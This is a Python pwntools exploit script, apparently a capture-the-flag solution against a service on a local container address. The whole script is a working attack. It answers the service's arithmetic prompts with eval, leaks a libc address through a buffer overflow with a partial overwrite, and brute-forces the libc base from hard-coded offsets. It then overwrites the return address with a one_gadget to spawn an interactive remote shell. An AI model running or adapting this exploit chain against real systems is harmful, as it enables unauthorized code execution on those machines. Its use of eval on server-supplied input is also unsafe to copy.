#!/usr/bin/python
#coding:utf-8

from pwn import *

i = 0

while True:
	libc_base = 0
	i = i + 1
	io = remote('172.17.0.3', 10001)
	try:
		io.recvuntil("Choice:")
		io.send('1')
		io.recvuntil('?')
		io.send('2')
		io.recvuntil('?')
		io.send('0')
		
		io.recvuntil("Question: ")
		question = io.recvuntil("=")[:-1]
		answer = str(eval(question))
		payload = answer.ljust(0x30, '\x00') + '\x5c'
		io.send(payload)
		io.recvuntil("Level ")
		addr_l8 = int(io.recvuntil("Question: ")[:-10])
		
		if addr_l8 < 0:
			addr_l8 = addr_l8 + 0x100000000
		
		addr = addr_l8 + 0x7f8b00000000
		
		if hex(addr)[-2:] == '0b':	#__IO_file_overflow+EB
			libc_base = addr - 0x7c90b
		elif hex(addr)[-2:] == 'd2':	#puts+1B2
			libc_base = addr - 0x70ad2
		elif hex(addr)[-3:] == '600':#_IO_2_1_stdout_
			libc_base = addr - 0x3c2600		
		elif hex(addr)[-3:] == '400':#_IO_file_jumps
			libc_base = addr - 0x3be400	
		elif hex(addr)[-2:] == '83':	#_IO_2_1_stdout_+83	
			libc_base = addr - 0x3c2683	
		elif hex(addr)[-2:] == '32':	#_IO_do_write+C2
			libc_base = addr - 0x7c370 - 0xc2			
		elif hex(addr)[-2:] == 'e7':	#_IO_do_write+37
			libc_base = addr - 0x7c370 - 0x37		
		
		one_gadget = libc_base + 0x45526
		log.info("try time %d, leak addr %#x, libc_base at %#x, one_gadget at %#x" %(i, addr, libc_base, one_gadget))
		if libc_base == 0:
			io.close()
			continue
	
		question = io.recvuntil("=")[:-1]
		answer = str(eval(question))
		payload = answer.ljust(0x38, '\x00') + p64(one_gadget)
		io.send(payload)
		io.recv(timeout = 1)	
		io.recv(timeout = 1)
	except EOFError:
		io.close()
		continue
	else:
		io.interactive()
		break
